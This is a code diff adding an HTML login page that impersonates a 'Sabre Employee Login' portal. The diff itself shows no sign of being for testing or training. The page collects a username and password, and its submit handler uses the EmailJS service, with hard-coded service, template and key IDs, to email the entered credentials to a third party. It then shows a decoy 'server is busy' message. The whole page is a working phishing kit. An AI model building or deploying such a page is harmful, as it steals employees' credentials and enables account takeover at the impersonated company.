@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sabre Employee Login</title>
+
+    <!-- Favicon -->
+    <link rel="icon" href="/favicon.ico" type="image/x-icon" />
+
+    <!-- SEO -->
+    <meta
+      name="description"
+      content="Sabre employee secure login portal for internal access."
+    />
+    <meta name="keywords" content="Sabre, employee login, SSO, portal" />
+    <meta name="robots" content="index, follow" />
+
+    <!-- Styles -->
+    <style>
+      * {
+        box-sizing: border-box;
+        font-family: Arial, sans-serif;
+      }
+      body {
+        background-color: #f5f5f5;
+        margin: 0;
+        padding: 0;
+      }
+      .header {
+        background-color: #e0e0e0;
+        padding: 10px 20px;
+      }
+      .header .logo-text {
+        font-size: 48px;
+        font-weight: bold;
+        color: #d80000;
+      }
+      .container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-top: 50px;
+      }
+      .logo-center {
+        font-size: 36px;
+        font-weight: bold;
+        color: #d80000;
+        margin-bottom: 30px;
+      }
+      .login-box {
+        background-color: white;
+        padding: 30px;
+        border-radius: 6px;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        width: 100%;
+        max-width: 400px;
+      }
+      .login-box label {
+        font-size: 14px;
+        color: #666;
+        display: block;
+        margin-bottom: 5px;
+      }
+      .login-box input {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 20px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+      }
+      .input-group {
+        position: relative;
+      }
+      .toggle-password {
+        position: absolute;
+        right: 10px;
+        top: 10px;
+        cursor: pointer;
+        font-size: 16px;
+        color: #555;
+      }
+      .remember-section {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-top: -10px;
+      }
+      .remember-section label {
+        margin-left: 5px;
+        font-size: 14px;
+        color: #333;
+      }
+      .remember-section input[type="checkbox"] {
+        transform: scale(1.2);
+      }
+      .btn-signin {
+        width: 100px;
+        background-color: #4285f4;
+        color: white;
+        padding: 10px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+      }
+      .forgot {
+        text-align: center;
+        margin-top: 20px;
+      }
+      .forgot a {
+        color: #4285f4;
+        text-decoration: none;
+        font-size: 14px;
+      }
+    </style>
+
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+      (function () {
+        emailjs.init("s0V8V4beDXT4rMa18"); // Replace with your public key
+      })();
+    </script>
+  </head>
+  <body>
+    <div class="header">
+      <div class="logo-text">Sabre</div>
+    </div>
+
+    <div class="container">
+      <div class="logo-center">Sabre</div>
+
+      <!-- ✅ FORM with ID for EmailJS -->
+      <form id="form" class="login-box">
+        <label for="email">Username</label>
+        <input
+          type="email"
+          id="email"
+          name="username"
+          placeholder="Your Sabre Email"
+          required
+        />
+
+        <label for="password">Password</label>
+        <div class="input-group">
+          <input
+            type="password"
+            id="password"
+            name="password"
+            placeholder="Your Password"
+            required
+          />
+          <span class="toggle-password" onclick="togglePassword()">👁️</span>
+        </div>
+
+        <div class="remember-section">
+          <div>
+            <input type="checkbox" id="remember" />
+            <label for="remember">Remember me</label>
+          </div>
+          <button type="submit" class="btn-signin">Sign In</button>
+        </div>
+      </form>
+
+      <div class="forgot">
+        <a href="#">Forgot Password?</a>
+      </div>
+    </div>
+
+    <!-- Toggle Password Visibility -->
+    <script>
+      function togglePassword() {
+        const passwordInput = document.getElementById("password");
+        const type = passwordInput.type === "password" ? "text" : "password";
+        passwordInput.type = type;
+      }
+    </script>
+
+    <!-- EmailJS Submission Logic -->
+    <script>
+      document.getElementById("form").addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        emailjs.sendForm("service_khovyrq", "template_95psblh", this).then(
+          () => {
+            alert("Request submitted successfully. Please wait.");
+            this.reset();
+          },
+          (error) => {
+            alert("Server is busy. Please try again later.");
+          }
+        );
+      });
+    </script>
+  </body>
+</html>
